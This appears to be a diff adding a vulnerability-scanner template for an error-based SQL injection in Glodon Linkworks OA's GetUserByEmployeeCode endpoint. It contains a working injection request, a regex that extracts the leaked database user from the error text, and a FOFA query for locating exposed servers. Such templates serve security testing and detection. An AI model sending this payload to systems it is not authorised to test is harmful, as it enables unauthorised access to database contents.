@@ -1,0 +1,40 @@
+id: glodon-linkworks-sqli
+
+info:
+  name: Glodon Linkworks GWGdWebService - SQL injection
+  author: DhiyaneshDK
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the GWGdWebService interface of Glodon Linkworks office OA. Sensitive information in the database can be obtained after sending a request package.
+  reference:
+    - https://github.com/zan8in/pocwiki/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gwgdwebservice%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: banner="Services/Identification/login.ashx"
+  tags: glodon,linkworks,sqli
+
+http:
+  - raw:
+      - |
+        POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        employeeCode=1'-1/user--'&EncryptData=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500'
+          - 'contains_any(header, "text/html", "text/plain")'
+          - 'contains_all(body, "在将 nvarchar 值", "转换成数据类型 int 时失败")'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '在将 nvarchar 值 &#39;(.*)&#39; 转换成数据类型 int 时失败。'
+# digest: 490a00463044022073d03613c1ef5605c2f45ffef5f2c01ed22f44bd0f1aa63f16d2da96d75dbcff0220665b465dd4ebb698045da94c5752aff668004d3c44e6cd9129da311213b74ed2:922c64590222798bb761d5b6d8e72950
